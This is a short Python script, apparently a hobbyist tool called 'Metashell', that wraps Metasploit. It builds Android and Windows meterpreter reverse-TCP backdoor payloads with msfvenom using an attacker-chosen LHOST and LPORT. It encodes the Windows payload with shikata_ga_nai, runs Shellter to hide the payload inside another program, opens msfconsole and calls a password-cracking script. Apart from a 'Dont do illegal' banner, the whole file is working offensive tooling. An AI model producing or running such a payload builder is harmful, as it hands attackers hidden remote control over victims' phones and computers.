import os;import time;import colorama;from colorama import Fore
os.system("cls");
def main():
  def ct(tup):str = ''.join(tup);return str;
  user = input("platform A/W, options M/E/L/PC: ")
  if (user == "a"):
    lhost = input("lhost=")
    lport = input("lport=")
    cmd = ("msfvenom -p android/meterpreter/reverse_tcp LHOST=",lhost," LPORT=",lport," -o pay.apk")
    str = ct(cmd)
    os.system(str)
    os.system("shellter.exe")
  if (user == "w"):
    lhost = input("lhost=")
    lport = input("lhost=")
    cmd = ("msfvenom -p windows/meterpreter/reverse_tcp LHOST=",lhost," LPORT=",lport," --platform windows -e x86/shikata_ga_nai -o pay.exe")
    str = ct(cmd)
    os.system(str)
    os.system("shellter.exe")
  if (user == "m"):
    lhost = input("lhost=")
    cmd = ("msfconsole")
    str = ct(cmd)
    os.system(str)
  if (user == "pc"):
    os.system("passcrack.py")
  if(user == "e"):exit();
  if (user == "l"):
    print("  *3/9/23 10:30:created the program today!(v0.1)")
    print("  *3/10/23 10:15:added automation using pyautogui.(v0.2)")
    print("  *3/10/23 4:17:added the constituent programs to the main program.(v0.2.2)")
print(Fore.RED + '''
   _____          __                .__           .__  .__   
  /     \   _____/  |______    _____|  |__   ____ |  | |  |  
 /  \ /  \_/ __ \   __\__  \  /  ___/  |  \_/ __ \|  | |  |  
/    Y    \  ___/|  |  / __ \_\___ \|   Y  \  ___/|  |_|  |__
\____|__  /\___  >__| (____  /____  >___|  /\___  >____/____/
        \/     \/          \/     \/     \/     \/           v1.0
Made by puttyX
-------------------
| Dont do illegal |
-------------------
''')
while 0 < 1:
    main()
